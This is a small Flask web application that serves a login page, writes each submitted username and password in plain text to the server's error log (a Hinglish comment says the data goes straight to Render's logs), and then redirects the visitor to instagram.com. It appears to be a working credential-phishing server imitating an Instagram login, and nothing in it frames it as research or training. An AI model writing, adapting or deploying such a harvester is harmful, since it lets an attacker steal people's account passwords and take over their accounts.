import sys
from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder='templates')

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Ye lines data ko turant Render ke logs mein bhejengi
    print(f"\n--- NEW LOGIN DETECTED ---", file=sys.stderr, flush=True)
    print(f"USERNAME: {username}", file=sys.stderr, flush=True)
    print(f"PASSWORD: {password}", file=sys.stderr, flush=True)
    print(f"--------------------------\n", file=sys.stderr, flush=True)
    
    return redirect("https://www.instagram.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
